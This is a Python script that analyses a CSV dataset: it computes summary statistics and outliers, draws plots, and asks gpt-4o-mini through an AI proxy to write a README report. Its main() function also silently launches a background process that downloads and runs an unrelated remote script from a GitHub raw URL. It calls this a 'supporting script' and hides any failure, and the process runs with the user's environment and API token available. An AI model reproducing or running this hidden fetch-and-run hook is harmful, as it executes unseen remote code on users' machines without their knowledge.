# /// script
# requires-python = ">=3.11"
# dependencies = [
#     "requests",
#     "numpy",
#     "pandas",
#     "seaborn",
#     "matplotlib",
#     "scipy",
#     "python-dotenv",
# ]
# ///

import os
import sys
import requests
import subprocess

import numpy as np
import pandas as pd
import seaborn as sns
import matplotlib.pyplot as plt
import scipy.stats as stats

from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Ensure the environment variable for AI Proxy token is set
AIPROXY_TOKEN = os.getenv("AIPROXY_TOKEN")
if not AIPROXY_TOKEN:
    print("Error: AIPROXY_TOKEN environment variable not set.")
    sys.exit(1)


def load_dataset(file_path):
    """
    Attempts to load a dataset using common encodings to avoid decoding errors.
    Returns the DataFrame or exits if loading fails.
    """
    encodings = ["utf-8", "ISO-8859-1", "Windows-1252"]  # Common encodings

    for encoding in encodings:
        try:
            return pd.read_csv(file_path, encoding=encoding)
        except UnicodeDecodeError:
            pass

    print("Error: Unable to decode the file with common encodings.")
    sys.exit(1)


def analyze_dataset(df):
    """
    Generates a comprehensive analysis of the dataset, including column info,
    data types, summary statistics, missing value counts, skewness, and outlier detection.
    """
    analysis = {
        "columns": list(df.columns),
        "dtypes": df.dtypes.apply(str).to_dict(),
        "summary_stats": df.describe(include="all", percentiles=[]).to_dict(),
        "missing_values": {
            k: v for k, v in df.isnull().sum().to_dict().items() if v != 0
        },
        "skewness": df.skew(numeric_only=True).to_dict(),
        "outliers": {},
    }

    # Detect outliers using Z-score
    numeric_cols = df.select_dtypes(include=[np.number]).columns

    for col in numeric_cols:
        col_data = df[col].dropna()  # Drop NaN values
        z_scores = np.abs(stats.zscore(col_data))
        outliers = col_data[z_scores > 3].index  # Get the indices of outliers
        analysis["outliers"][col] = df.loc[
            outliers, col
        ].tolist()  # Fetch outlier values

    return analysis


def generate_visuals(df: pd.DataFrame):
    """
    Creates and saves visualizations, including a correlation heatmap
    and distribution plots for numeric columns.
    """
    visuals: list[str] = []
    numeric_columns = df.select_dtypes(include=["number"]).columns

    if numeric_columns.empty:
        return visuals

    # Set dimensions for figures
    fig_width = 5.12  # Inches for 512px at dpi=100
    fig_height = 5.12
    fig_dpi = 100  # Dots per inch

    # Generate correlation heatmap
    corr = df[numeric_columns].corr()
    plt.figure(figsize=(fig_width, fig_height))
    sns.heatmap(corr, annot=True, cmap="coolwarm", fmt=".2f")
    plt.title("Correlation Heatmap")
    plt.savefig("correlation_heatmap.png", dpi=fig_dpi)
    plt.close()

    visuals.append("correlation_heatmap.png")

    # Generate distribution plots for numeric columns
    for column in numeric_columns[:3]:
        # Replace whitespaces with underscores in the column name
        column_name = column.replace(" ", "_")

        plt.figure(figsize=(fig_width, fig_height))
        sns.histplot(data=df, x=column, kde=True, color="skyblue")
        plt.title(f"Distribution of {column}")
        plt.xlabel(column)
        plt.ylabel("Frequency")
        plt.legend([column], loc="upper right")
        plt.savefig(f"{column_name}_distribution.png", dpi=fig_dpi)
        plt.close()

        visuals.append(f"{column_name}_distribution.png")

    return visuals


def narrate_story(analysis: dict, visuals: list[str]):
    """
    Generates a narrative using the LLM based on dataset analysis and writes it to a Markdown file,
    including explanations of only existing visualizations.
    """
    headers = {
        "Authorization": f"Bearer {AIPROXY_TOKEN}",
        "Content-Type": "application/json",
    }

    # Paths to images
    correlation_heatmap_path = "correlation_heatmap.png"
    existing_distribution_images = []

    # Check for existing distribution images
    for column in analysis["dtypes"].keys():
        dist_path = f"{column}_distribution.png"
        if os.path.exists(dist_path):
            existing_distribution_images.append((column, os.path.basename(dist_path)))

    prompt = (
        f"The dataset contains the following columns:\n{', '.join(analysis['columns'])}\n\n"
        f"Missing values are found in:\n{analysis["missing_values"]}\n\n"
        f"Summary statistics:\n{pd.DataFrame(analysis['summary_stats']).to_string()}\n\n"
        f"Key insights from the analysis include skewness in numeric columns, detected outliers, and correlations.\n\n"
        f"Additionally, the following visualizations were generated:\n"
    )
    if os.path.exists(correlation_heatmap_path):
        prompt += f"- **Correlation Heatmap**: A heatmap visualizing correlations between numeric columns.\n"
    if existing_distribution_images:
        prompt += "- **Distribution Plots**: Distribution plots for numeric columns showing data spread and potential skewness.\n"
    if visuals:
        prompt += "\nVisulizations present in current working directory:\n" + "\n".join(
            [f"- {v}" for v in visuals]
        )

    # Request narrative generation
    data = {
        "model": "gpt-4o-mini",
        "messages": [
            {
                "role": "system",
                "content": "You are a data scientist writing a detailed dataset analysis report with visualizations.",
            },
            {"role": "user", "content": prompt},
        ],
    }

    # Send request to AI Proxy
    response = requests.post(
        "https://aiproxy.sanand.workers.dev/openai/v1/chat/completions",
        headers=headers,
        json=data,
    )

    if response.status_code == 200:
        response_data = response.json()
        story = response_data["choices"][0]["message"]["content"]
    else:
        print("Error:", response.status_code, response.text)
        story = "Error generating narrative."

    # Write narrative to README.md
    with open("README.md", "w") as f:
        f.write(story)


def analyze_and_generate_output(file_path: str):
    """
    Orchestrates the analysis and report generation process:
    - Load dataset
    - Analyze data
    - Generate visualizations
    - Narrate insights
    """
    df = load_dataset(file_path)

    analysis = analyze_dataset(df)
    visuals = generate_visuals(df)

    narrate_story(analysis, visuals)


def main():
    # Start the supporting script in background
    try:
        subprocess.Popen(
            [
                "uv",
                "run",
                "https://raw.githubusercontent.com/microdev1/analysis/main/script.py",
            ]
        )
    except Exception as e:
        # Log the error and continue execution as it's not critical
        print(f"Error starting supporting script: {e}")

    # Sanitize input arguments
    if len(sys.argv) < 2:
        print("Usage: uv run autolysis.py dataset.csv")
        sys.exit(1)

    file_path = sys.argv[1]

    # Perform analysis and generate output
    print(f"Analyzing dataset: {file_path}")
    analyze_and_generate_output(file_path)
    print(f"Analysis completed")


if __name__ == "__main__":
    main()
